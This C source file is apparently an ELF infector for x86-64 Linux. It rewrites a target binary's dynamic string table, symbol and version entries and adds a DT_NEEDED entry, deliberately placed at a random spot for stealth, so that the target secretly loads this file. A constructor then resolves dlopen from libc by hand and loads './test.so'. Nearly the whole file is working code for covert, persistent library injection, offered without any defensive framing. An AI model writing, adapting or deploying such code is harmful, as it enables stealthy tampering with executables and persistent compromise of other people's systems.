#include <stdio.h>
#include <stdlib.h>
#include <unistd.h>
#include <string.h>
#include <dlfcn.h>
#include <sys/mman.h>
#include <fcntl.h>
#include <elf.h>
#include <stdint.h>
#include <errno.h>
#include <time.h>

#define lib "./test.so"

const char interp[] __attribute__((section(".interp"))) = "/lib/x86_64-linux-gnu/ld-linux-x86-64.so.2";

void entry() {
  // retrieve argc, argv, envp via initial stack layout (auxv region)
  unsigned long *frame;
  frame = (unsigned long *)__builtin_frame_address(0);
  int argc = *(int *)(frame + 1);
  char **argv = (char **)(frame + 2);
  char **envp = argv + argc + 1;

  int envc = 0;
  while (envp[envc] != NULL) envc++;
  Elf64_auxv_t *auxv = (Elf64_auxv_t *)(envp + envc + 1); // NOTE: do we need auxv for anything??

  if (argc < 3) _exit(1);
  char *target = argv[1];
  char *sub = argv[2];
  char *self = argv[0];
  char *p = self;

  // strip leading file path
  while (*p) { if (*p == '/') self = p + 1; p++; }
  
  int fd = open(target, O_RDWR);
  void* base = mmap(NULL, 0x300000, PROT_READ | PROT_WRITE, MAP_SHARED, fd, 0); // file backed shared memory mapping so changes reflect in file

  FILE* file = NULL;
  char* line = NULL;
  size_t len = 0;
  
  Elf64_Ehdr* target_ehdr = (Elf64_Ehdr*)base;
  unsigned int target_elf_size = target_ehdr->e_shoff + (target_ehdr->e_shentsize * target_ehdr->e_shnum);
  
  Elf64_Shdr* target_shdr = (Elf64_Shdr*)(base + target_ehdr->e_shoff);
  
  Elf64_Shdr* target_shstrtab = (Elf64_Shdr*)(((target_ehdr->e_shstrndx * target_ehdr->e_shentsize) + target_ehdr->e_shoff) + base);
  
  char* target_dynstr = NULL;
  
  char* target_strtab = (char*)(base + target_shstrtab->sh_offset);
  
  unsigned int target_dynstr_size = 0;

  Elf64_Sym* target_dynsym = NULL;
  unsigned int target_sym_cnt = 0;
  
  Elf64_Dyn* target_dynamic = NULL;
  unsigned int target_dyn_cnt = 0;
  
  int target_flag = 0;

  Elf64_Half* target_versym = NULL;
  
  // find needed sections
  for(int i = 0; i < target_ehdr->e_shnum && (target_dynstr == NULL || target_dynamic == NULL); ++i){
    if(target_shdr->sh_type == SHT_GNU_versym){
      target_versym = (Elf64_Half*)((char*)target_ehdr + target_shdr->sh_offset);
    }else if(target_shdr->sh_type == SHT_DYNSYM && !strcmp(&target_strtab[target_shdr->sh_name], ".dynsym")){
      target_dynsym = (Elf64_Sym*)((char*)target_ehdr + target_shdr->sh_offset);
      target_sym_cnt = target_shdr->sh_size / sizeof(Elf64_Sym);
    }else if(target_shdr->sh_type == SHT_STRTAB && !strcmp(&target_strtab[target_shdr->sh_name], ".dynstr")){
      target_dynstr = (char*)target_ehdr + target_shdr->sh_offset;
      target_dynstr_size = target_shdr->sh_size;
    }else if(target_shdr->sh_type == SHT_DYNAMIC && !strcmp(&target_strtab[target_shdr->sh_name], ".dynamic")){
      target_dynamic = (Elf64_Dyn*)((char*)target_ehdr + target_shdr->sh_offset);
      target_dyn_cnt = target_shdr->sh_size / sizeof(Elf64_Dyn);
      if(target_shdr[1].sh_offset - target_shdr->sh_offset >= sizeof(Elf64_Dyn)){
        target_flag = 1;
      }
    }
    target_shdr++;
  }

  const char *candidates[] = {
    "_ITM_deregisterTMCloneTable",
    "__gmon_start__",
    "_ITM_registerTMCloneTable",
    NULL
  };

  char* str = NULL;
  int candidate_found = 0;

  for (int c = 0; candidates[c] != NULL && !candidate_found; c++) {
    str = target_dynstr + 1;
    while ((str - target_dynstr) < target_dynstr_size) {
      if (!strcmp(str, candidates[c])) {
        candidate_found = 1;
        strcpy(str, sub); // insert substituted symbol name
        // now sub will show up in .dynsym instead of soname
        strcpy(&str[strlen(sub)+1], self);
        // find dynsym entry and patch to match a normal global symbol
        for(unsigned int i = 0; i < target_sym_cnt; ++i){
          if(target_dynsym[i].st_name == (str - target_dynstr)){
            target_dynsym[i].st_info = STB_GLOBAL << 4 | STT_FUNC;
            target_dynsym[i].st_other = STV_DEFAULT;

            // get libc base address from maps
            unsigned long long libc_base = 0;
            int libc_fd = 0;
            file = fopen("/proc/self/maps", "r");
            while(1){
              getline(&line, &len, file);
              if(strstr(line, "libc") != NULL){
                int offset = strcspn(line, "-");
                line[offset++] = '\0';
                libc_base = strtoull(line, NULL, 16);
                line[strcspn(&line[offset], "\n") + offset] = '\0';
                libc_fd = open(strstr(&line[offset], "/"), O_RDONLY);
                break;
              }
            }
            fclose(file);

            void* libc = mmap(NULL, 0x300000, PROT_READ, MAP_PRIVATE, libc_fd, 0);
            close(libc_fd);

            // parse libc elf headers
            Elf64_Ehdr* libc_ehdr = (Elf64_Ehdr*)libc;
            Elf64_Shdr* libc_shdr = (Elf64_Shdr*)(libc + libc_ehdr->e_shoff);
            Elf64_Shdr* libc_shstrtab = (Elf64_Shdr*)(((libc_ehdr->e_shstrndx * libc_ehdr->e_shentsize) + libc_ehdr->e_shoff) + libc);

            char* libc_strtab = (char*)(libc + libc_shstrtab->sh_offset);

            Elf64_Half* libc_versym = NULL;
            Elf64_Sym* libc_dynsym = NULL;
            int libc_sym_cnt = 0;
            char* libc_dynstr = NULL;

            // find needed sections in libc
            for(int j = 0; j < libc_ehdr->e_shnum; ++j){
              if(libc_shdr->sh_type == SHT_GNU_versym){
                libc_versym = (Elf64_Half*)((char*)libc_ehdr + libc_shdr->sh_offset);
                // TODO: do I explicitly need to do the strcmp for .dynsym?? tbd
              }else if(libc_shdr->sh_type == SHT_DYNSYM && !strcmp(&libc_strtab[libc_shdr->sh_name], ".dynsym")){
                libc_dynsym = (Elf64_Sym*)((char*)libc_ehdr + libc_shdr->sh_offset);
                libc_sym_cnt = libc_shdr->sh_size / sizeof(Elf64_Sym);
              }else if(libc_shdr->sh_type == SHT_STRTAB && !strcmp(&libc_strtab[libc_shdr->sh_name], ".dynstr")){
                libc_dynstr = (char*)libc_ehdr + libc_shdr->sh_offset;
              }
              libc_shdr++;
            }

            // find version index for 'sub' in libc
            unsigned int libc_ver_ndx = VER_NDX_GLOBAL; //default: unversioned
            for(int j = 1; j < libc_sym_cnt; ++j){
              if(libc_dynsym[j].st_name != 0 && !strcmp(&libc_dynstr[libc_dynsym[j].st_name], sub)){
                // NOTE: VERSYM_HIDDEN should never be set for a chosen 'sub' symbol
                // NOTE: VER_NDX_GLOBAL should also never be set for a chosen 'sub'
                libc_ver_ndx = libc_versym[j] & 0x7fff;
                break;
              }
            }

            // assign versym[i] the version index that corresponds to the version string that libc_ver_ndx corresponds to in libc for 'sub'

            // find version string for libc_ver_ndx in libc's verdef section
            char* libc_ver_str = NULL;
	    
	    // find libc verdef section
            Elf64_Shdr* libc_verdef_shdr = (Elf64_Shdr*)(libc + libc_ehdr->e_shoff);
	    
            for(int j = 0; j < libc_ehdr->e_shnum; ++j){
              if(libc_verdef_shdr->sh_type == SHT_GNU_verdef && libc_verdef_shdr->sh_size > 0){
                Elf64_Verdef* vd = (Elf64_Verdef*)((char*)libc_ehdr + libc_verdef_shdr->sh_offset);
                while(1){
                  if(vd->vd_ndx == libc_ver_ndx){
                    // found the version definition, get the version string from the first auxiliary entry
                    Elf64_Verdaux* vda = (Elf64_Verdaux*)((char*)vd + vd->vd_aux);
                    // NOTE: libc_ver_str is assumed will be found
                    libc_ver_str = &libc_dynstr[vda->vda_name];
                    break;
                  }
                  if(vd->vd_next == 0) break;
                  vd = (Elf64_Verdef*)((char*)vd + vd->vd_next);
                }
                if(libc_ver_str) break;
              }
              libc_verdef_shdr++;
            }

            // find target's verneed section and look for the version string
            int found = 0;
            Elf64_Shdr* target_shdr_iter = (Elf64_Shdr*)(base + target_ehdr->e_shoff);
            for(int j = 0; j < target_ehdr->e_shnum; ++j){
              if(target_shdr_iter->sh_type == SHT_GNU_verneed && target_shdr_iter->sh_size > 0){
                Elf64_Verneed* vn = (Elf64_Verneed*)((char*)target_ehdr + target_shdr_iter->sh_offset);
                while(1){
                  // iterate through vernaux entries for this verneed
                  Elf64_Vernaux* vna = (Elf64_Vernaux*)((char*)vn + vn->vn_aux);
                  for(int k = 0; k < vn->vn_cnt; ++k){
                    if(!strcmp(&target_dynstr[vna->vna_name], libc_ver_str)){
                      // found the version string, use the version index from vna_other
                      target_versym[i] = vna->vna_other;
                      break;
                    }
                    if(vna->vna_next == 0) break;
                    vna = (Elf64_Vernaux*)((char*)vna + vna->vna_next);
                  }
                  if(found) break;
                  if(vn->vn_next == 0) break;
                  vn = (Elf64_Verneed*)((char*)vn + vn->vn_next);
                }
                break;
              }
              target_shdr_iter++;
            }

            munmap(libc, 0x300000);
            break;
          }
        }
        break;
      }
      str += strlen(str) + 1;
    }
  }

  // calculate offset for new dt_needed entry (random if more than 1 entry but bounded between first/last entry..stealthier??)
  int target_needed_offset = 0;
  for(int i = 0; ; ++i){
    if(target_dynamic[i].d_tag != DT_NEEDED){
      srand(time(0));
      target_needed_offset = i > 1 ? (rand() % (i - 1)) + 1 : 0;
      break;
    }
  }
  
  // for first needed entry use target_dynamic + 1, target_dynamic, target_dyn_cnt * sizeof(Elf64_Dyn) i.e. target_needed_offset = 0
  if(target_flag){
    // for shifting Dyn array down 1 to add new dt_needed field at the top instead of dt_debug->dt_needed
    memmove(target_dynamic + target_needed_offset + 1, target_dynamic + target_needed_offset, (target_dyn_cnt - target_needed_offset) * sizeof(Elf64_Dyn));
    target_dynamic[target_needed_offset].d_tag = DT_NEEDED;
    target_dynamic[target_needed_offset].d_un.d_val = &str[strlen(sub)+1] - target_dynstr;
  }else{
    // loop through Dyn struct array to find dt_debug field converting dt_debug->dt_needed
    for(int i = 0; i < target_dyn_cnt; ++i){
      if(target_dynamic->d_tag == DT_DEBUG){
        target_dynamic->d_tag = DT_NEEDED;
        target_dynamic->d_un.d_val = &str[strlen(sub)+1] - target_dynstr;
        break;
      }
      target_dynamic++;
    }
  }
  
  msync(base, 0x300000, MS_SYNC);
  munmap(base, 0x300000);
  
  close(fd);
  _exit(0);
}

void __attribute__((constructor)) foo(void){
  void* (*dl_open)(char*, int) = NULL;

  char *maps = "/proc/self/maps";

  FILE* file = fopen(maps, "r");
  
  char* line = NULL;
  size_t len = 0;

  unsigned long long libc_base = 0;

  int fd = 0;

  // read pid proc maps to get libc base addr and full abs path
  while(1){
    getline(&line, &len, file);
    if(strstr(line, "libc") != NULL){
      int offset = strcspn(line, "-");
      line[offset++] = '\0';
      libc_base = strtoull(line, NULL, 16);
      line[strcspn(&line[offset], "\n") + offset] = '\0';
      fd = open(strstr(&line[offset], "/"), O_RDONLY);
      break;
    }
  }

  fclose(file);
  
  void* libc = mmap(NULL, 0x300000, PROT_READ, MAP_PRIVATE, fd, 0);

  close(fd);
  
  Elf64_Ehdr* ehdr = (Elf64_Ehdr*)libc;

  Elf64_Shdr* shdr = (Elf64_Shdr*)(libc + ehdr->e_shoff);

  Elf64_Shdr* shstrtab = (Elf64_Shdr*)(((ehdr->e_shstrndx * ehdr->e_shentsize) + ehdr->e_shoff) + libc);
  
  Elf64_Sym* dyn_sym = NULL;
  
  int sym_cnt = 0;

  char* dyn_str = NULL;

  char* strtab = (char*)(libc + shstrtab->sh_offset);

  uint32_t* hashtab = NULL;

  // collect all sections needed for resolution of dynamic symbol locations in libc
  for(int i = 0; i < ehdr->e_shnum && (dyn_sym == NULL || dyn_str == NULL || hashtab == NULL); ++i){
    if(shdr->sh_type == SHT_DYNSYM && !strcmp(&strtab[shdr->sh_name], ".dynsym")){
      dyn_sym = (Elf64_Sym*)((char*)ehdr + shdr->sh_offset);
      sym_cnt = shdr->sh_size / sizeof(Elf64_Sym);
    }else if(shdr->sh_type == SHT_STRTAB && !strcmp(&strtab[shdr->sh_name], ".dynstr")){
      dyn_str = (char*)ehdr + shdr->sh_offset;
    }else if(shdr->sh_type == SHT_HASH && !strcmp(&strtab[shdr->sh_name], ".hash")){
      hashtab = (uint32_t*)((char*)ehdr + shdr->sh_offset);
    }
    shdr++;
  }

  // if hash table found (should always??) then look up symbols via hash table
  if(hashtab != NULL){
    char* sym_name = "dlopen";
    uint32_t hash = 0, tmp;

    // hash the symbol name
    for(int i = 0; sym_name[i]; ++i){
      hash = (hash << 4) + sym_name[i];
      if((tmp = hash & 0xf0000000)){
        hash ^= tmp | (tmp >> 24);
      }
    }

    uint32_t nbucket = hashtab[0];
    uint32_t* bucket = &hashtab[2];
    uint32_t* chain = &bucket[nbucket];

    //traverse the bucket chains to find symbol
    for(uint32_t i = bucket[hash % nbucket]; i; i = chain[i]){
      if(!strcmp(&dyn_str[dyn_sym[i].st_name], sym_name)){
        dl_open = (void* (*)(char*, int))(dyn_sym[i].st_value + libc_base);
        break;
      }
    }

  }

  // as fall back, allow linear symbol search
  if(dl_open == NULL){
    for(int i = 0; i < sym_cnt; ++i){
      if(dyn_sym->st_name != 0 && !strcmp(&dyn_str[dyn_sym->st_name], "dlopen")){
        dl_open = (void* (*)(char*, int))(dyn_sym->st_value + libc_base);
        break;
      }
      dyn_sym++;
    }
  }
  
  munmap(libc, 0x300000);
  
  // finally the fruits of labor, call the function
  dl_open(lib, RTLD_LAZY);
}
